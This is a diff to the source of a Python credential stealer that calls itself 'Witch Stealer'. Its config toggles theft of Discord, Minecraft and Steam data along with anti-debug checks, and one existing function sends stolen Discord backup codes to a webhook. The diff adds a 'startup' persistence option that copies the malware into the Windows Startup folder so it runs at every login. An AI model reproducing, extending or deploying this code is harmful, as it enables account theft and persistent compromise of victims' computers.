@@ -28,6 +28,7 @@ __CONFIG__ = {
     "webhook": "",
     "discord": False,
     "system": False,
+    "startup": False,
     "minecraft": False,
     "Steam": False,
     "Anti_Debugs_VM": False,
@@ -621,6 +622,17 @@ def discord_backup_code_steal():
         requests.post(__CONFIG__["webhook"], json={"username": "Witch Stealer", "avatar_url": __CONFIG__['avatar_link']}, files=files)
 
 
+def startup():
+    my = sys.executable
+    startupfolder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    path = os.path.join(startupfolder, os.path.basename(my))
+
+    if my != path and not os.path.exists(path):
+        shutil.copy2(my, path)
+ 
+    else:
+        pass
+
 #def startup():
 #   startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
 #
@@ -646,6 +658,9 @@ def run_config():
     # =========================== #
     if __CONFIG__.get("system"):
         systeminformation()
+    # =========================== #
+    if __CONFIG__.get("startup"):
+        startup()
     # =========================== #
     if __CONFIG__.get("minecraft"):
         minecraft_cache()
